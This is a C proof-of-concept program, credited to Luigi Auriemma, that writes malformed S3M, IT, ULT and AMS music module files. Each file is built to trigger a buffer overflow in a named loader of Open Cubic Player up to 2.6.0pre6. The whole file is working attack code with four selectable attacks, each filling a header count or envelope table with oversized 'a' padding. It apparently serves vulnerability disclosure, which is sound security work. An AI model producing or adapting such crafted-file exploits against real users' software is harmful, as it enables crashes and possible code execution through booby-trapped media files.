/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>



#define VER         "0.1"
#define POCNAME     "proof-of-concept"



void fwbof(FILE *fd, int len, int chr);
void fwi08(FILE *fd, int num);
void fwi16(FILE *fd, int num);
void fwi32(FILE *fd, int num);
void fwstx(FILE *fd, uint8_t *str, int size);
void fwmem(FILE *fd, uint8_t *data, int size);
void std_err(void);



#pragma pack(1)

typedef struct {
    int8_t      name[28];
    uint8_t     kennung;
    uint8_t     typ;
    uint8_t     dummy[2];
    uint16_t    ordnum;
    uint16_t    insnum;
    uint16_t    patnum;
    uint16_t    flags;
    uint16_t    cwtv;
    uint16_t    ffi;
    int8_t      scrm[4];
    uint8_t     gv;
    uint8_t     is;
    uint8_t     it;
    uint8_t     mv;
    uint8_t     uc;
    uint8_t     dp;
    uint8_t     dummy2[8];
    uint16_t    special;
    uint8_t     chanset[32];
} s3m_t;

typedef struct {
    uint8_t     sign[4];    // IMPM
    uint8_t     name[26];
    uint16_t    PHiligt;
    uint16_t    OrdNum;
    uint16_t    InsNum;
    uint16_t    SmpNum;
    uint16_t    PatNum;
    uint16_t    Cwtv;
    uint16_t    Cmwt;
    uint16_t    Flags;
    uint16_t    Special;
    uint8_t     GV;
    uint8_t     MV;
    uint8_t     IS;
    uint8_t     IT;
    uint8_t     Sep;
    uint8_t     PWD;
    uint16_t    MsgLgth;
    uint32_t    MsgOff;
    uint32_t    Reserved;
} it_t;

#define AMSNAMELEN  8       // < 128
typedef struct {
    uint8_t     ins;
    uint16_t    pat;
    uint16_t    pos;
    uint16_t    bpm;
    uint8_t     speed;
    uint8_t     defchn;
    uint8_t     defcmd;
    uint8_t     defrow;
    uint16_t    flags;
} ams_t;

#pragma pack()



int main(int argc, char *argv[]) {
    FILE    *fd;
    s3m_t   s3m;
    it_t    it;
    ams_t   ams;
    int     i,
            j,
            tmp,
            attack;
    char    *fname;

    setbuf(stdout, NULL);

    fputs("\n"
        "Open Cubic Player <= 2.6.0pre6 / 0.1.10_rc5 multiple vulnerabilities "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 3) {
        printf("\n"
            "Usage: %s <attack> <output_file>\n"
            "\n"
            "Attacks:\n"
            " 1 = buffer-overflow in mpLoadS3M        (*.S3M)\n"
            " 2 = buffer-overflow in itload.cpp       (*.IT)\n"
            " 3 = buffer-overflow in mpLoadULT        (*.ULT)\n"
            " 4 = buffer-overflow (envs) in mpLoadAMS (*.AMS)\n"
            "\n", argv[0]);
        exit(1);
    }

    attack = atoi(argv[1]);
    fname  = argv[2];

    printf("- create file %s\n", fname);
    fd = fopen(fname, "wb");
    if(!fd) std_err();

    if(attack == 1) {

        memset(&s3m, 0, sizeof(s3m));
        strncpy(s3m.name,  POCNAME, sizeof(s3m.name));
        s3m.kennung = 0x1a;
        s3m.typ     = 16;
        s3m.ordnum  = 800;
        memcpy(s3m.scrm, "SCRM", 4);

        fwrite(&s3m, sizeof(s3m), 1, fd);

        for(i = 0; i < s3m.ordnum - 1; i++) fputc('a', fd);
        fputc(0, fd);                                   // for forcing "return errFormMiss"

    } else if(attack == 2) {

        memset(&it, 0, sizeof(it));
        memcpy(it.sign, "IMPM", 4);
        strncpy(it.name, POCNAME, sizeof(it.name));
        it.Cmwt   = 0x200;
        it.OrdNum = 1000;                               // buffer-overflow
//        it.InsNum = 200;                                // buffer-overflow

        fwrite(&it, sizeof(it), 1, fd);

        for(i = 0; i < 64;        i++) fwi08(fd, 0);
        for(i = 0; i < 64;        i++) fwi08(fd, 0);
        for(i = 0; i < it.OrdNum; i++) fwi08(fd, 'a');
        for(i = 0; i < it.InsNum; i++) fwi32(fd, 'a');
        for(i = 0; i < it.SmpNum; i++) fwi32(fd, 'a');
        for(i = 0; i < it.PatNum; i++) fwi32(fd, 'a');

    } else if(attack == 3) {

        fwmem(fd, "MAS_UTrack_V00", 14);
        fwi08(fd, 3 + '1');
        fwstx(fd, POCNAME, 32);
        fwi08(fd, 0);                                   // msglen
        fwi08(fd, 0);                                   // insnum
        fwbof(fd, 256, 0);                              // orders
        tmp = 0x7f;
        fwi08(fd, tmp);                                 // chnn
        fwi08(fd, 0);                                   // patn
        fwbof(fd, tmp, 'a');                            // buffer-overflow

            // possible heap overflow with chbp, patlength = 0

    } else if(attack == 4) {

        fwmem(fd, "AMShdr\x1A", 7);                     // sig
        fwi08(fd, AMSNAMELEN);                          // sig[7]
        fwbof(fd, AMSNAMELEN, 'a');                     // name
        fwi16(fd, 0x202);                               // filever

        memset(&ams, 0, sizeof(ams));
        ams.ins = 1;

        fwrite(&ams, sizeof(ams), 1, fd);

        for(j = 0; j < ams.ins; j++) {
            fwi08(fd, AMSNAMELEN);                      // namelen
            fwbof(fd, AMSNAMELEN, 'a');                 // name
            fwi08(fd, 1);                               // smpnum

            fwbof(fd, 120, 0);                          // samptab

            for(i = 0; i < 3; i++) {                    // envs
                tmp = 0xff;
                fwi08(fd, 0);                           // speed
                fwi08(fd, 0);                           // sustain
                fwi08(fd, 0);                           // loopstart
                fwi08(fd, 0);                           // loopend
                fwi08(fd, tmp);                         // points
                fwbof(fd, tmp * 3, 'a');
            }
        }

    } else {
        printf("\nError: you must specify the right attack number\n");
    }

    fclose(fd);
    printf("- finished\n");
    return(0);
}



void fwbof(FILE *fd, int len, int chr) {
    while(len--) fputc(chr, fd);
}



void fwi08(FILE *fd, int num) {
    fputc((num      ) & 0xff, fd);
}



void fwi16(FILE *fd, int num) {
    fputc((num      ) & 0xff, fd);
    fputc((num >>  8) & 0xff, fd);
}



void fwi32(FILE *fd, int num) {
    fputc((num      ) & 0xff, fd);
    fputc((num >>  8) & 0xff, fd);
    fputc((num >> 16) & 0xff, fd);
    fputc((num >> 24) & 0xff, fd);
}



void fwstx(FILE *fd, uint8_t *str, int size) {
    int     i;

    for(i = 0; str[i] && (i < size); i++) {
        fputc(str[i], fd);
    }
    for(; i < size; i++) {
        fputc(0, fd);
    }
}



void fwmem(FILE *fd, uint8_t *data, int size) {
    fwrite(data, size, 1, fd);
}



void std_err(void) {
    perror("\nError");
    exit(1);
}


